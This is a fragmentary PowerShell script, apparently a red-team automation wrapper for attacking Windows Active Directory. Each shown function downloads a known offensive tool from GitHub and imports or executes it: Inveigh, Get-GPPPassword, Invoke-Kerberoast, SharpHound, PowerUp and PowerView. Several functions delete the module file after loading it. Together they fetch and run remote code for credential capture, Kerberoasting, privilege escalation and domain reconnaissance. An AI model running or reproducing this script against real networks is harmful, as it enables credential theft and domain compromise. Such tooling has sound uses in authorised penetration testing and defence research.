...
function Inveigh {
    ...
    $Inveigh = Invoke-WebRequest -Uri https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1
    [System.IO.File]::WriteAllText("$path/Inv.psm1", $Inveigh.content)
    Import-Module $path/Inv.psm1
    Remove-Item $path/Inv.psm1
...
#GPP
function GPP {
    $GPPP = Invoke-WebRequest -Uri https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Get-GPPPassword.ps1
    ...
    Remove-Item $path/GPP.ps1
    Get-GPPPassword
}
#Kerberoast
function Kerberoast {
    $Kerb = Invoke-WebRequest -Uri https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1
...
function Bloodhound {
    ...
    $sharp = Invoke-WebRequest -Uri https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.exe?raw=true
    Set-Content $spath -Value $sharp.content -Encoding Byte -Force
    Start-Process $spath
}
#PrivEsc
function PrivEsc {
    $PrivEsc = Invoke-WebRequest -Uri https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
    ...
    Remove-Item $path/PrivEsc.psm1
    Invoke-AllChecks | Out-File $path\PrivEsc.txt
}
#PowahView
function PView {
    $PView = Invoke-WebRequest -Uri https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
    [System.IO.File]::WriteAllText("$path/PView.psm1", $PView.content)
    Import-Module $path/PView.psm1
    Remove-Item $path/PView.psm1
